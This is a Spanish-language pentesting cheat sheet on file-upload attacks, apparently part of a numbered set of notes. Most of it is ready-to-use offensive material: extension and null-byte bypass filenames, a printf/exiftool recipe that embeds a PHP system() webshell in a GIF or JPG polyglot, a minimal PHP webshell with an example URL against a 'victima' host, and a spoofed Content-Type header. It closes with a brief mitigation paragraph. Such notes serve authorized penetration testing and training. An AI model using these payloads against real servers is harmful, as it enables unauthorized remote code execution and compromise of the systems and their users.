# File Upload

Objetivo: subir un fichero ejecutable (webshell / payload) y lograr que el
servidor lo interprete → RCE.

## Primero: ¿qué filtra la app?

| Control | Cómo se salta |
|---------|---------------|
| Extensión (blacklist) | extensiones alternativas, mayúsc., doble ext., bytes nulos |
| Extensión (allowlist) | doble extensión, polyglot, confiar en content-type |
| Content-Type | cambiar header `Content-Type: image/png` en Burp |
| Magic bytes | prefijar cabecera de imagen real (polyglot) |
| Nombre aleatorio del server | combinar con LFI / fuerza bruta del nombre |

## Extensiones alternativas (PHP)

```
.php .php3 .php4 .php5 .phtml .pht .phar .inc
shell.php.jpg          (doble extensión)
shell.jpg.php
shell.pHp              (case)
shell.php%00.jpg       (null byte, stacks antiguos)
shell.php.             (punto final / espacio)
```

Otros stacks: `.asp .aspx .ashx` (IIS), `.jsp .jspx` (Java), `.py` si hay CGI.

## Polyglot imagen + PHP

Prefija magic bytes de imagen para pasar validación de "¿es imagen real?":

```bash
# GIF
printf 'GIF89a;\n<?php system($_GET["c"]); ?>' > shell.php.gif
# o añade el header en el EXIF de un JPG real y renómbralo según el filtro
exiftool -Comment='<?php system($_GET["c"]); ?>' real.jpg
```

## Webshell mínima (PHP)

```php
<?php system($_GET['cmd']); ?>
```

Uso: `http://victima/uploads/shell.php?cmd=id`

> Para un informe más limpio, salta directo a reverse shell en vez de webshell:
> ver [12-shells-pivoting.md](12-shells-pivoting.md).

## Bypass vía Content-Type (en Burp)

```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png          <-- mentimos aquí
```

## Encadenado con Directory Traversal

Si el nombre/ruta del upload es controlable, un `../` en `filename` puede
escribir fuera del directorio de uploads (sobrescribir una vista/handler del
server → RCE). Ver [05-lfi-traversal.md](05-lfi-traversal.md).

## Frameworks: módulos vulnerables

Paneles de admin con componentes desactualizados (ej. gestores de archivos de
Laravel/CMS) suelen permitir subir `.php` tras un bypass trivial. Identifica
versión del módulo → busca el CVE/PoC.

## Mitigación

Allowlist de extensión **y** content-type **y** magic bytes, renombrar con valor
aleatorio, almacenar fuera del webroot, servir con `Content-Disposition`,
deshabilitar ejecución en el directorio de uploads.
